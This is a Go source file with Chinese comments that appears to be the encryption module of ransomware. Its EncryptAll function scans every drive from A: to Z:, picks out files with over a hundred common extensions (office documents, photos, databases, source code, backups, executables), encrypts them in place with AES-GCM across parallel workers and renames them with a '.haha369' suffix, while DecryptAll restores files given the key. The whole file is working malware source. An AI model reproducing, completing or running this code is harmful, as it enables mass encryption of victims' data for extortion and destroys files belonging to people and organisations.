package components

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"encoding/base64"
	"encoding/hex"
	"errors"
	"fmt"
	"io"
	"io/fs"
	"os"
	"path/filepath"
	"runtime"
	"strings"
	"sync"
)

// GenerateRandomHex32 生成16字节随机数，并转为32个字符的Hex字符串
func GenerateRandomHex32() string {
	b := make([]byte, 16)
	_, err := rand.Read(b)
	if err != nil {
		return ""
	}
	return hex.EncodeToString(b)
}

// CSjiami 对明文使用指定密钥进行AES-GCM加密，并返回Base64编码的密文
func CSjiami(plainText, key string) string {
	cipherBytes, err := aesGCMEncrypt([]byte(plainText), []byte(key))
	if err != nil {
		return ""
	}
	return base64.StdEncoding.EncodeToString(cipherBytes)
}

// CSjiemi 对Base64编码的密文使用指定密钥进行AES-GCM解密，并返回明文
func CSjiemi(cipherText, key string) string {
	rawCipher, _ := base64.StdEncoding.DecodeString(cipherText)
	plainBytes, err := aesGCMDecrypt(rawCipher, []byte(key))
	if err != nil {
		return ""
	}
	return string(plainBytes)
}

// ===========================
//
//	加密流程：EncryptAll （多线程实现）
//
// ===========================
func EncryptAll(Miyao string) error {
	key := []byte(Miyao)
	var targetExts = []string{
		// Office 文档 + 文本 + PDF
		".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx", ".csv",
		".txt", ".rtf", ".pdf",
		".odt", ".ods", ".odp", // OpenDocument 文档格式
		".wps", ".et", ".dps", // WPS Office 套件格式

		// 图片格式
		".jpg", ".jpeg", ".png", ".gif", ".bmp", ".tiff",
		".webp", ".ico", ".svg", ".heic",

		// 音视频格式
		".mp3", ".wav", ".mp4", ".avi", ".mov", ".mkv",
		".flac", ".aac", ".ogg",
		".flv", ".wmv", ".webm",

		// 设计文件
		".psd", ".ai",
		".sketch", ".cdr",

		// 压缩包/归档文件
		".zip", ".rar", ".7z",
		".tar", ".gz", ".bz2", ".xz",

		// 镜像/备份文件
		".iso", ".bak",

		// 数据库文件
		".db", ".sql", ".mdb", ".accdb", ".sqlite",

		// 财务文件 (如有专有后缀可继续添加)
		// ".xxx",

		// 源代码文件
		".c", ".cpp", ".java", ".py", ".php", ".go", ".cs",
		".rb", ".swift", ".kt", ".scala", ".ts", ".rs", ".dart", ".lua", ".pl",

		// 前端文件
		".html", ".css", ".js",

		// 脚本文件
		".sh", ".bat", ".ps1", ".xml", ".config", ".dat", ".pdb",

		// 可执行与系统文件
		".exe", ".dll", ".sys", ".apk", ".jar", ".bin",

		// 工程文件
		".sln", ".gradle",

		// CAD
		".dwg", ".dxf", ".step", ".iges",

		// 3D/视频工程与模型文件
		".max", ".blend", ".prproj",
		".obj", ".fbx", ".stl",

		// 其他配置/数据文件
		".xml", ".json", ".ini", ".log",
		".yaml", ".yml", ".toml",

		// 流程图与思维导图文件
		".vsd",    // Microsoft Visio 旧版
		".vsdx",   // Microsoft Visio 新版
		".drawio", // draw.io 文件
		".dia",    // Dia 绘图文件
		".mm",     // FreeMind 思维导图
		".xmind",  // XMind 思维导图
		".mmap",   // MindManager 思维导图
	}

	// 创建任务通道和同步等待组
	taskCh := make(chan string, 100)
	var wg sync.WaitGroup

	// 根据CPU核心数启动多个工作协程
	numWorkers := runtime.NumCPU() * 2
	for i := 0; i < numWorkers; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			for path := range taskCh {
				fmt.Println("开始加密文件:", path)
				if err := encryptFile(path, key); err != nil {
					fmt.Printf("加密文件 %s 失败: %v\n", path, err)
				} else {
					fmt.Printf("加密文件 %s 成功\n", path)
				}
			}
		}()
	}

	// 遍历各盘符并扫描符合条件的文件，发送到任务通道处理
	for drive := 'A'; drive <= 'Z'; drive++ {
		drivePath := fmt.Sprintf("%c:/", drive)
		if _, err := os.Stat(drivePath); os.IsNotExist(err) {
			continue
		}
		fmt.Println("开始扫描盘符(加密):", drivePath)

		// WalkDir遍历文件和文件夹
		err := filepath.WalkDir(drivePath, func(path string, d fs.DirEntry, err error) error {
			if err != nil {
				fmt.Printf("无法访问 %s，跳过。错误原因: %v\n", path, err)
				if d != nil && d.IsDir() {
					return filepath.SkipDir
				}
				return nil
			}

			if !d.IsDir() && matchExtensions(path, targetExts) {
				fmt.Println("找到文件(待加密):", path)
				taskCh <- path
			}
			return nil
		})
		if err != nil {
			fmt.Printf("遍历盘符 %s 出错: %v\n", drivePath, err)
			continue
		}
	}

	// 关闭任务通道并等待所有工作协程结束
	close(taskCh)
	wg.Wait()
	return nil
}

// ===========================
//
//	解密流程：DecryptAll （多线程实现）
//
// ===========================
func DecryptAll(Miyao string) error {
	key := []byte(Miyao)

	taskCh := make(chan string, 100)
	var wg sync.WaitGroup

	numWorkers := runtime.NumCPU() * 2
	for i := 0; i < numWorkers; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			for path := range taskCh {
				fmt.Println("开始解密文件:", path)
				if err := decryptFile(path, key); err != nil {
					fmt.Printf("解密文件 %s 失败: %v\n", path, err)
				} else {
					fmt.Printf("解密文件 %s 成功\n", path)
				}
			}
		}()
	}

	for drive := 'A'; drive <= 'Z'; drive++ {
		drivePath := fmt.Sprintf("%c:/", drive)
		if _, err := os.Stat(drivePath); os.IsNotExist(err) {
			continue
		}
		fmt.Println("开始扫描盘符(解密):", drivePath)

		err := filepath.WalkDir(drivePath, func(path string, d fs.DirEntry, err error) error {
			if err != nil {
				fmt.Printf("无法访问 %s，跳过。错误原因: %v\n", path, err)
				if d != nil && d.IsDir() {
					return filepath.SkipDir
				}
				return nil
			}

			// 只处理后缀为 .haha369 的文件
			if !d.IsDir() && strings.HasSuffix(path, ".haha369") {
				fmt.Println("找到文件(待解密):", path)
				taskCh <- path
			}
			return nil
		})
		if err != nil {
			fmt.Printf("遍历盘符 %s 出错: %v\n", drivePath, err)
			continue
		}
	}

	close(taskCh)
	wg.Wait()
	return nil
}

// ===========================
//
//    文件加解密及工具函数
//
// ===========================

// encryptFile 读取原文件内容并使用AES-GCM加密，然后覆盖写回并重命名
func encryptFile(filename string, key []byte) error {
	plainData, err := os.ReadFile(filename)
	if err != nil {
		return err
	}
	cipherData, err := aesGCMEncrypt(plainData, key)
	if err != nil {
		return err
	}
	if err := os.WriteFile(filename, cipherData, 0644); err != nil {
		return err
	}
	newFilename := filename + ".haha369"
	if err := os.Rename(filename, newFilename); err != nil {
		return err
	}
	return nil
}

// decryptFile 读取加密文件内容并使用AES-GCM解密，然后覆盖写回并去掉后缀
func decryptFile(filename string, key []byte) error {
	cipherData, err := os.ReadFile(filename)
	if err != nil {
		return err
	}
	plainData, err := aesGCMDecrypt(cipherData, key)
	if err != nil {
		return err
	}
	if err := os.WriteFile(filename, plainData, 0644); err != nil {
		return err
	}
	newFilename := strings.TrimSuffix(filename, ".haha369")
	if err := os.Rename(filename, newFilename); err != nil {
		return err
	}
	return nil
}

func matchExtensions(path string, exts []string) bool {
	ext := filepath.Ext(path)
	for _, e := range exts {
		if e == ext {
			return true
		}
	}
	return false
}

// AES-GCM 加密函数
func aesGCMEncrypt(plaintext, key []byte) ([]byte, error) {
	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, err
	}
	aesgcm, err := cipher.NewGCM(block)
	if err != nil {
		return nil, err
	}
	nonce := make([]byte, aesgcm.NonceSize())
	if _, err = io.ReadFull(rand.Reader, nonce); err != nil {
		return nil, err
	}
	ciphertext := aesgcm.Seal(nonce, nonce, plaintext, nil)
	return ciphertext, nil
}

// AES-GCM 解密函数
func aesGCMDecrypt(ciphertext, key []byte) ([]byte, error) {
	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, err
	}
	aesgcm, err := cipher.NewGCM(block)
	if err != nil {
		return nil, err
	}
	nonceSize := aesgcm.NonceSize()
	if len(ciphertext) < nonceSize {
		return nil, errors.New("ciphertext too short")
	}
	nonce := ciphertext[:nonceSize]
	data := ciphertext[nonceSize:]
	plaintext, err := aesgcm.Open(nil, nonce, data, nil)
	if err != nil {
		return nil, err
	}
	return plaintext, nil
}
